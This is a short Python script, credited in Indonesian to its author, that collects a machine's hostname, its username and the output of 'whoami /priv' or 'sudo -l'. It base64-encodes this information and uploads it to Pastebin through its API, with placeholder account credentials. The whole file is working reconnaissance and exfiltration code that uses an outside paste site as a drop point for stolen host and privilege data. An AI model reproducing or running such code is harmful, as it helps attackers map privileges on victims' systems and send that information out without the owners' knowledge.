# Dibuat oleh Rafel Susanto

from subprocess import Popen, PIPE
import socket
import getpass
import os
import base64
import requests

# host info
HOSTNAME=socket.gethostname()
USER=getpass.getuser()
PRIVILEGE=""

# pastebin info -> change the pastebin info
PB_USERNAME="ENTER YOUR USERNAME" 
PB_PASSWORD="ENTER YOUR PASSWORD" 
PB_API_DEV_KEY="ENTER YOUR KEY" 
PB_TITLE="ENTER PASTEBIN TITLE"


def get_privilege():
	priv = ""
	if os.name == 'nt':
		p = Popen("whoami /priv", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
		priv , err = p.communicate()
	else:
		p = Popen("sudo -l", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
		priv , err = p.communicate()
		if priv == b'':
			priv = err
	return priv.decode()

def pastebin(text):

	pb_login = {
		'api_dev_key':PB_API_DEV_KEY,
		'api_user_name':PB_USERNAME,
		'api_user_password':PB_PASSWORD
	}

	pb_upload = {
		'api_option': 'paste',
		'api_dev_key':PB_API_DEV_KEY,
		'api_paste_code':text,
		'api_paste_name':PB_TITLE,
		'api_user_key': None
	}

	login = requests.post("https://pastebin.com/api/api_login.php", data=pb_login)
	print("Login status: ", login.status_code if login.status_code != 200 else "OK/200")
	print("User token: ", login.text)
	pb_upload['api_user_key'] = login.text

	
	r = requests.post("https://pastebin.com/api/api_post.php", data=pb_upload)
	print("Paste URL: ", r.text)


if __name__ == "__main__":
	PRIVILEGE = get_privilege()
	host_info = f"Hostname: {HOSTNAME}\n\nUsername: {USER}\n\nUser Privileges: {PRIVILEGE}"
	host_info = base64.b64encode(host_info.encode('ascii'))
	pastebin(host_info)
